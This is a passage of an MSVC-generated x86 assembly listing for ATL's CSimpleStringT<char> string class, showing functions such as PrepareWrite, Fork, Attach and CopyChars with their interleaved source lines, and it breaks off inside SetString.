  0005c	8b 45 f0	 mov	 eax, DWORD PTR _pNewData$[ebp]
  0005f	50		 push	 eax
  00060	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00063	e8 00 00 00 00	 call	 ?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ; ATL::CSimpleStringT<char,0>::Attach
$LN5@Reallocate:

; 864  : 	}

  00068	5f		 pop	 edi
  00069	5e		 pop	 esi
  0006a	5b		 pop	 ebx
  0006b	8b e5		 mov	 esp, ebp
  0006d	5d		 pop	 ebp
  0006e	c2 04 00	 ret	 4
?Reallocate@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ENDP	; ATL::CSimpleStringT<char,0>::Reallocate
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?PrepareWrite2@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z
_TEXT	SEGMENT
_nNewLength$1 = -12					; size = 4
_pOldData$ = -8						; size = 4
_this$ = -4						; size = 4
_nLength$ = 8						; size = 4
?PrepareWrite2@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z PROC	; ATL::CSimpleStringT<char,0>::PrepareWrite2, COMDAT
; _this$ = ecx

; 818  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 819  : 		CStringData* pOldData = GetData();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	89 45 f8	 mov	 DWORD PTR _pOldData$[ebp], eax

; 820  : 		if( pOldData->nDataLength > nLength )

  00017	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0001a	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001d	3b 4d 08	 cmp	 ecx, DWORD PTR _nLength$[ebp]
  00020	7e 09		 jle	 SHORT $LN2@PrepareWri

; 821  : 		{
; 822  : 			nLength = pOldData->nDataLength;

  00022	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00025	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  00028	89 4d 08	 mov	 DWORD PTR _nLength$[ebp], ecx
$LN2@PrepareWri:

; 823  : 		}
; 824  : 		if( pOldData->IsShared() )

  0002b	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  0002e	e8 00 00 00 00	 call	 ?IsShared@CStringData@ATL@@QBE_NXZ ; ATL::CStringData::IsShared
  00033	0f b6 c0	 movzx	 eax, al
  00036	85 c0		 test	 eax, eax
  00038	74 0e		 je	 SHORT $LN3@PrepareWri

; 825  : 		{
; 826  : 			Fork( nLength );

  0003a	8b 45 08	 mov	 eax, DWORD PTR _nLength$[ebp]
  0003d	50		 push	 eax
  0003e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00041	e8 00 00 00 00	 call	 ?Fork@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::Fork

; 827  : 		}

  00046	eb 52		 jmp	 SHORT $LN1@PrepareWri
$LN3@PrepareWri:

; 828  : 		else if( pOldData->nAllocLength < nLength )

  00048	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0004b	8b 48 08	 mov	 ecx, DWORD PTR [eax+8]
  0004e	3b 4d 08	 cmp	 ecx, DWORD PTR _nLength$[ebp]
  00051	7d 47		 jge	 SHORT $LN1@PrepareWri

; 829  : 		{
; 830  : 			// Grow exponentially, until we hit 1G, then by 1M thereafter.
; 831  : 			int nNewLength = pOldData->nAllocLength;

  00053	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00056	8b 48 08	 mov	 ecx, DWORD PTR [eax+8]
  00059	89 4d f4	 mov	 DWORD PTR _nNewLength$1[ebp], ecx

; 832  : 			if( nNewLength > 1024 * 1024 * 1024 )

  0005c	81 7d f4 00 00
	00 40		 cmp	 DWORD PTR _nNewLength$1[ebp], 1073741824 ; 40000000H
  00063	7e 0d		 jle	 SHORT $LN6@PrepareWri

; 833  : 			{
; 834  : 				nNewLength += 1024 * 1024;

  00065	8b 45 f4	 mov	 eax, DWORD PTR _nNewLength$1[ebp]
  00068	05 00 00 10 00	 add	 eax, 1048576		; 00100000H
  0006d	89 45 f4	 mov	 DWORD PTR _nNewLength$1[ebp], eax

; 835  : 			}

  00070	eb 0e		 jmp	 SHORT $LN7@PrepareWri
$LN6@PrepareWri:

; 836  : 			else
; 837  : 			{
; 838  : 				// Exponential growth factor is 1.5.
; 839  : 				nNewLength = nNewLength + nNewLength / 2;

  00072	8b 45 f4	 mov	 eax, DWORD PTR _nNewLength$1[ebp]
  00075	99		 cdq
  00076	2b c2		 sub	 eax, edx
  00078	d1 f8		 sar	 eax, 1
  0007a	03 45 f4	 add	 eax, DWORD PTR _nNewLength$1[ebp]
  0007d	89 45 f4	 mov	 DWORD PTR _nNewLength$1[ebp], eax
$LN7@PrepareWri:

; 840  : 			}
; 841  : 			if( nNewLength < nLength )

  00080	8b 45 f4	 mov	 eax, DWORD PTR _nNewLength$1[ebp]
  00083	3b 45 08	 cmp	 eax, DWORD PTR _nLength$[ebp]
  00086	7d 06		 jge	 SHORT $LN8@PrepareWri

; 842  : 			{
; 843  : 				nNewLength = nLength;

  00088	8b 45 08	 mov	 eax, DWORD PTR _nLength$[ebp]
  0008b	89 45 f4	 mov	 DWORD PTR _nNewLength$1[ebp], eax
$LN8@PrepareWri:

; 844  : 			}
; 845  : 			Reallocate( nNewLength );

  0008e	8b 45 f4	 mov	 eax, DWORD PTR _nNewLength$1[ebp]
  00091	50		 push	 eax
  00092	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00095	e8 00 00 00 00	 call	 ?Reallocate@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::Reallocate
$LN1@PrepareWri:

; 846  : 		}
; 847  : 	}

  0009a	5f		 pop	 edi
  0009b	5e		 pop	 esi
  0009c	5b		 pop	 ebx
  0009d	8b e5		 mov	 esp, ebp
  0009f	5d		 pop	 ebp
  000a0	c2 04 00	 ret	 4
?PrepareWrite2@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ENDP	; ATL::CSimpleStringT<char,0>::PrepareWrite2
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?PrepareWrite@?$CSimpleStringT@D$0A@@ATL@@AAEPADH@Z
_TEXT	SEGMENT
_nTooShort$ = -16					; size = 4
_nShared$ = -12						; size = 4
_pOldData$ = -8						; size = 4
_this$ = -4						; size = 4
_nLength$ = 8						; size = 4
?PrepareWrite@?$CSimpleStringT@D$0A@@ATL@@AAEPADH@Z PROC ; ATL::CSimpleStringT<char,0>::PrepareWrite, COMDAT
; _this$ = ecx

; 803  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 804  : 		if (nLength < 0)

  0000c	83 7d 08 00	 cmp	 DWORD PTR _nLength$[ebp], 0
  00010	7d 0a		 jge	 SHORT $LN2@PrepareWri

; 805  : 			AtlThrow(E_INVALIDARG);

  00012	68 57 00 07 80	 push	 -2147024809		; 80070057H
  00017	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN2@PrepareWri:

; 806  : 
; 807  : 		CStringData* pOldData = GetData();

  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00024	89 45 f8	 mov	 DWORD PTR _pOldData$[ebp], eax

; 808  : 		int nShared = 1-pOldData->nRefs;  // nShared < 0 means true, >= 0 means false

  00027	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0002a	b9 01 00 00 00	 mov	 ecx, 1
  0002f	2b 48 0c	 sub	 ecx, DWORD PTR [eax+12]
  00032	89 4d f4	 mov	 DWORD PTR _nShared$[ebp], ecx

; 809  : 		int nTooShort = pOldData->nAllocLength-nLength;  // nTooShort < 0 means true, >= 0 means false

  00035	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00038	8b 48 08	 mov	 ecx, DWORD PTR [eax+8]
  0003b	2b 4d 08	 sub	 ecx, DWORD PTR _nLength$[ebp]
  0003e	89 4d f0	 mov	 DWORD PTR _nTooShort$[ebp], ecx

; 810  : 		if( (nShared|nTooShort) < 0 )  // If either sign bit is set (i.e. either is less than zero), we need to copy data

  00041	8b 45 f4	 mov	 eax, DWORD PTR _nShared$[ebp]
  00044	0b 45 f0	 or	 eax, DWORD PTR _nTooShort$[ebp]
  00047	7d 0c		 jge	 SHORT $LN3@PrepareWri

; 811  : 		{
; 812  : 			PrepareWrite2( nLength );

  00049	8b 45 08	 mov	 eax, DWORD PTR _nLength$[ebp]
  0004c	50		 push	 eax
  0004d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00050	e8 00 00 00 00	 call	 ?PrepareWrite2@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ; ATL::CSimpleStringT<char,0>::PrepareWrite2
$LN3@PrepareWri:

; 813  : 		}
; 814  : 
; 815  : 		return( m_pszData );

  00055	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00058	8b 00		 mov	 eax, DWORD PTR [eax]
$LN4@PrepareWri:

; 816  : 	}

  0005a	5f		 pop	 edi
  0005b	5e		 pop	 esi
  0005c	5b		 pop	 ebx
  0005d	8b e5		 mov	 esp, ebp
  0005f	5d		 pop	 ebp
  00060	c2 04 00	 ret	 4
?PrepareWrite@?$CSimpleStringT@D$0A@@ATL@@AAEPADH@Z ENDP ; ATL::CSimpleStringT<char,0>::PrepareWrite
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ PROC ; ATL::CSimpleStringT<char,0>::GetData, COMDAT
; _this$ = ecx

; 799  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 800  : 		return( reinterpret_cast< CStringData* >( m_pszData )-1 );

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 00		 mov	 eax, DWORD PTR [eax]
  00011	83 e8 10	 sub	 eax, 16			; 00000010H

; 801  : 	}

  00014	5f		 pop	 edi
  00015	5e		 pop	 esi
  00016	5b		 pop	 ebx
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ENDP ; ATL::CSimpleStringT<char,0>::GetData
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?Fork@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z
_TEXT	SEGMENT
tv84 = -88						; size = 4
tv76 = -88						; size = 4
_nCharsToCopy$ = -20					; size = 4
_pNewData$ = -16					; size = 4
_nOldLength$ = -12					; size = 4
_pOldData$ = -8						; size = 4
_this$ = -4						; size = 4
_nLength$ = 8						; size = 4
?Fork@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z PROC		; ATL::CSimpleStringT<char,0>::Fork, COMDAT
; _this$ = ecx

; 783  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 58	 sub	 esp, 88			; 00000058H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 784  : 		CStringData* pOldData = GetData();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?GetData@?$CSimpleStringT@D$0A@@ATL@@ABEPAUCStringData@2@XZ ; ATL::CSimpleStringT<char,0>::GetData
  00014	89 45 f8	 mov	 DWORD PTR _pOldData$[ebp], eax

; 785  : 		int nOldLength = pOldData->nDataLength;

  00017	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  0001a	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001d	89 4d f4	 mov	 DWORD PTR _nOldLength$[ebp], ecx

; 786  : 		CStringData* pNewData = pOldData->pStringMgr->Clone()->Allocate( nLength, sizeof( XCHAR ) );

  00020	8b 45 f8	 mov	 eax, DWORD PTR _pOldData$[ebp]
  00023	8b 08		 mov	 ecx, DWORD PTR [eax]
  00025	8b 55 f8	 mov	 edx, DWORD PTR _pOldData$[ebp]
  00028	8b 01		 mov	 eax, DWORD PTR [ecx]
  0002a	8b 0a		 mov	 ecx, DWORD PTR [edx]
  0002c	8b 50 10	 mov	 edx, DWORD PTR [eax+16]
  0002f	ff d2		 call	 edx
  00031	89 45 a8	 mov	 DWORD PTR tv76[ebp], eax
  00034	6a 01		 push	 1
  00036	8b 45 08	 mov	 eax, DWORD PTR _nLength$[ebp]
  00039	50		 push	 eax
  0003a	8b 4d a8	 mov	 ecx, DWORD PTR tv76[ebp]
  0003d	8b 11		 mov	 edx, DWORD PTR [ecx]
  0003f	8b 4d a8	 mov	 ecx, DWORD PTR tv76[ebp]
  00042	8b 02		 mov	 eax, DWORD PTR [edx]
  00044	ff d0		 call	 eax
  00046	89 45 f0	 mov	 DWORD PTR _pNewData$[ebp], eax

; 787  : 		if( pNewData == NULL )

  00049	83 7d f0 00	 cmp	 DWORD PTR _pNewData$[ebp], 0
  0004d	75 05		 jne	 SHORT $LN2@Fork

; 788  : 		{
; 789  : 			ThrowMemoryException();

  0004f	e8 00 00 00 00	 call	 ?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ ; ATL::CSimpleStringT<char,0>::ThrowMemoryException
$LN2@Fork:

; 790  : 		}
; 791  : 		int nCharsToCopy = ((nOldLength < nLength) ? nOldLength : nLength)+1;  // Copy '\0'

  00054	8b 45 f4	 mov	 eax, DWORD PTR _nOldLength$[ebp]
  00057	3b 45 08	 cmp	 eax, DWORD PTR _nLength$[ebp]
  0005a	7d 08		 jge	 SHORT $LN4@Fork
  0005c	8b 4d f4	 mov	 ecx, DWORD PTR _nOldLength$[ebp]
  0005f	89 4d a8	 mov	 DWORD PTR tv84[ebp], ecx
  00062	eb 06		 jmp	 SHORT $LN5@Fork
$LN4@Fork:
  00064	8b 55 08	 mov	 edx, DWORD PTR _nLength$[ebp]
  00067	89 55 a8	 mov	 DWORD PTR tv84[ebp], edx
$LN5@Fork:
  0006a	8b 45 a8	 mov	 eax, DWORD PTR tv84[ebp]
  0006d	83 c0 01	 add	 eax, 1
  00070	89 45 ec	 mov	 DWORD PTR _nCharsToCopy$[ebp], eax

; 792  : 		CopyChars( PXSTR( pNewData->data() ), nCharsToCopy,

  00073	8b 45 ec	 mov	 eax, DWORD PTR _nCharsToCopy$[ebp]
  00076	50		 push	 eax
  00077	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  0007a	e8 00 00 00 00	 call	 ?data@CStringData@ATL@@QAEPAXXZ ; ATL::CStringData::data
  0007f	50		 push	 eax
  00080	8b 4d ec	 mov	 ecx, DWORD PTR _nCharsToCopy$[ebp]
  00083	51		 push	 ecx
  00084	8b 4d f0	 mov	 ecx, DWORD PTR _pNewData$[ebp]
  00087	e8 00 00 00 00	 call	 ?data@CStringData@ATL@@QAEPAXXZ ; ATL::CStringData::data
  0008c	50		 push	 eax
  0008d	e8 00 00 00 00	 call	 ?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ; ATL::CSimpleStringT<char,0>::CopyChars
  00092	83 c4 10	 add	 esp, 16			; 00000010H

; 793  : 			PCXSTR( pOldData->data() ), nCharsToCopy );
; 794  : 		pNewData->nDataLength = nOldLength;

  00095	8b 45 f0	 mov	 eax, DWORD PTR _pNewData$[ebp]
  00098	8b 4d f4	 mov	 ecx, DWORD PTR _nOldLength$[ebp]
  0009b	89 48 04	 mov	 DWORD PTR [eax+4], ecx

; 795  : 		pOldData->Release();

  0009e	8b 4d f8	 mov	 ecx, DWORD PTR _pOldData$[ebp]
  000a1	e8 00 00 00 00	 call	 ?Release@CStringData@ATL@@QAEXXZ ; ATL::CStringData::Release

; 796  : 		Attach( pNewData );

  000a6	8b 45 f0	 mov	 eax, DWORD PTR _pNewData$[ebp]
  000a9	50		 push	 eax
  000aa	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000ad	e8 00 00 00 00	 call	 ?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ; ATL::CSimpleStringT<char,0>::Attach
$LN3@Fork:

; 797  : 	}

  000b2	5f		 pop	 edi
  000b3	5e		 pop	 esi
  000b4	5b		 pop	 ebx
  000b5	8b e5		 mov	 esp, ebp
  000b7	5d		 pop	 ebp
  000b8	c2 04 00	 ret	 4
?Fork@?$CSimpleStringT@D$0A@@ATL@@AAEXH@Z ENDP		; ATL::CSimpleStringT<char,0>::Fork
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_pData$ = 8						; size = 4
?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z PROC ; ATL::CSimpleStringT<char,0>::Attach, COMDAT
; _this$ = ecx

; 779  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 780  : 		m_pszData = static_cast< PXSTR >( pData->data() );

  0000c	8b 4d 08	 mov	 ecx, DWORD PTR _pData$[ebp]
  0000f	e8 00 00 00 00	 call	 ?data@CStringData@ATL@@QAEPAXXZ ; ATL::CStringData::data
  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	89 01		 mov	 DWORD PTR [ecx], eax

; 781  : 	}

  00019	5f		 pop	 edi
  0001a	5e		 pop	 esi
  0001b	5b		 pop	 ebx
  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c2 04 00	 ret	 4
?Attach@?$CSimpleStringT@D$0A@@ATL@@AAEXPAUCStringData@2@@Z ENDP ; ATL::CSimpleStringT<char,0>::Attach
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ
_TEXT	SEGMENT
?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ PROC ; ATL::CSimpleStringT<char,0>::ThrowMemoryException, COMDAT

; 772  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 773  : 		AtlThrow( E_OUTOFMEMORY );

  00009	68 0e 00 07 80	 push	 -2147024882		; 8007000eH
  0000e	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN2@ThrowMemor:

; 774  : 	}

  00013	5f		 pop	 edi
  00014	5e		 pop	 esi
  00015	5b		 pop	 ebx
  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?ThrowMemoryException@?$CSimpleStringT@D$0A@@ATL@@KAXXZ ENDP ; ATL::CSimpleStringT<char,0>::ThrowMemoryException
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?StringLength@?$CSimpleStringT@D$0A@@ATL@@SAHPBD@Z
_TEXT	SEGMENT
_psz$ = 8						; size = 4
?StringLength@?$CSimpleStringT@D$0A@@ATL@@SAHPBD@Z PROC	; ATL::CSimpleStringT<char,0>::StringLength, COMDAT

; 721  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 722  : 		if( psz == NULL )

  00009	83 7d 08 00	 cmp	 DWORD PTR _psz$[ebp], 0
  0000d	75 04		 jne	 SHORT $LN2@StringLeng

; 723  : 		{
; 724  : 			return( 0 );

  0000f	33 c0		 xor	 eax, eax
  00011	eb 0c		 jmp	 SHORT $LN1@StringLeng
$LN2@StringLeng:

; 725  : 		}
; 726  : 		return( int( strlen( psz ) ) );

  00013	8b 45 08	 mov	 eax, DWORD PTR _psz$[ebp]
  00016	50		 push	 eax
  00017	e8 00 00 00 00	 call	 _strlen
  0001c	83 c4 04	 add	 esp, 4
$LN1@StringLeng:

; 727  : 	}

  0001f	5f		 pop	 edi
  00020	5e		 pop	 esi
  00021	5b		 pop	 ebx
  00022	8b e5		 mov	 esp, ebp
  00024	5d		 pop	 ebp
  00025	c3		 ret	 0
?StringLength@?$CSimpleStringT@D$0A@@ATL@@SAHPBD@Z ENDP	; ATL::CSimpleStringT<char,0>::StringLength
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?CopyCharsOverlapped@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z
_TEXT	SEGMENT
_pchDest$ = 8						; size = 4
_nDestLen$ = 12						; size = 4
_pchSrc$ = 16						; size = 4
_nChars$ = 20						; size = 4
?CopyCharsOverlapped@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z PROC ; ATL::CSimpleStringT<char,0>::CopyCharsOverlapped, COMDAT

; 716  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 717  : 		memmove_s( pchDest, nDestLen*sizeof( XCHAR ),

  00009	8b 45 14	 mov	 eax, DWORD PTR _nChars$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 10	 mov	 ecx, DWORD PTR _pchSrc$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 0c	 mov	 edx, DWORD PTR _nDestLen$[ebp]
  00014	52		 push	 edx
  00015	8b 45 08	 mov	 eax, DWORD PTR _pchDest$[ebp]
  00018	50		 push	 eax
  00019	e8 00 00 00 00	 call	 _memmove_s
  0001e	83 c4 10	 add	 esp, 16			; 00000010H

; 718  : 			pchSrc, nChars*sizeof( XCHAR ) );
; 719  : 	}

  00021	5f		 pop	 edi
  00022	5e		 pop	 esi
  00023	5b		 pop	 ebx
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c3		 ret	 0
?CopyCharsOverlapped@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ENDP ; ATL::CSimpleStringT<char,0>::CopyCharsOverlapped
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z
_TEXT	SEGMENT
_pchDest$ = 8						; size = 4
_nDestLen$ = 12						; size = 4
_pchSrc$ = 16						; size = 4
_nChars$ = 20						; size = 4
?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z PROC ; ATL::CSimpleStringT<char,0>::CopyChars, COMDAT

; 695  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 696  : 		memcpy_s( pchDest, nDestLen*sizeof( XCHAR ),

  00009	8b 45 14	 mov	 eax, DWORD PTR _nChars$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 10	 mov	 ecx, DWORD PTR _pchSrc$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 0c	 mov	 edx, DWORD PTR _nDestLen$[ebp]
  00014	52		 push	 edx
  00015	8b 45 08	 mov	 eax, DWORD PTR _pchDest$[ebp]
  00018	50		 push	 eax
  00019	e8 00 00 00 00	 call	 _memcpy_s
  0001e	83 c4 10	 add	 esp, 16			; 00000010H

; 697  : 			pchSrc, nChars*sizeof( XCHAR ) );
; 698  : 	}

  00021	5f		 pop	 edi
  00022	5e		 pop	 esi
  00023	5b		 pop	 ebx
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c3		 ret	 0
?CopyChars@?$CSimpleStringT@D$0A@@ATL@@SAXPADIPBDH@Z ENDP ; ATL::CSimpleStringT<char,0>::CopyChars
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBDH@Z
_TEXT	SEGMENT
_pszBuffer$1 = -16					; size = 4
_nOffset$2 = -12					; size = 4
_nOldLength$3 = -8					; size = 4
_this$ = -4						; size = 4
_pszSrc$ = 8						; size = 4
_nLength$ = 12						; size = 4
?SetString@?$CSimpleStringT@D$0A@@ATL@@QAEXPBDH@Z PROC	; ATL::CSimpleStringT<char,0>::SetString, COMDAT
; _this$ = ecx

; 607  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 608  : 		if( nLength == 0 )

  0000c	83 7d 0c 00	 cmp	 DWORD PTR _nLength$[ebp], 0
  00010	75 0d		 jne	 SHORT $LN2@SetString

; 609  : 		{
; 610  : 			Empty();

  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ?Empty@?$CSimpleStringT@D$0A@@ATL@@QAEXXZ ; ATL::CSimpleStringT<char,0>::Empty

; 611  : 		}

  0001a	e9 8d 00 00 00	 jmp	 $LN7@SetString
$LN2@SetString:

; 612  : 		else
; 613  : 		{
; 614  : 			// It is possible that pszSrc points to a location inside of our
; 615  : 			// buffer.  GetBuffer() might change m_pszData if (1) the buffer
; 616  : 			// is shared or (2) the buffer is too small to hold the new
; 617  : 			// string.  We detect this aliasing, and modify pszSrc to point
; 618  : 			// into the newly allocated buffer instead.
; 619  : 
; 620  : 			if(pszSrc == NULL)

  0001f	83 7d 08 00	 cmp	 DWORD PTR _pszSrc$[ebp], 0
  00023	75 0a		 jne	 SHORT $LN4@SetString

; 621  : 				AtlThrow(E_INVALIDARG);

  00025	68 57 00 07 80	 push	 -2147024809		; 80070057H
  0002a	e8 00 00 00 00	 call	 ?AtlThrowImpl@ATL@@YGXJ@Z ; ATL::AtlThrowImpl
$LN4@SetString:

; 622  : 
; 623  : 			UINT nOldLength = GetLength();

  0002f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00032	e8 00 00 00 00	 call	 ?GetLength@?$CSimpleStringT@D$0A@@ATL@@QBEHXZ ; ATL::CSimpleStringT<char,0>::GetLength
  00037	89 45 f8	 mov	 DWORD PTR _nOldLength$3[ebp], eax

; 624  : 			UINT_PTR nOffset = pszSrc-GetString();

  0003a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
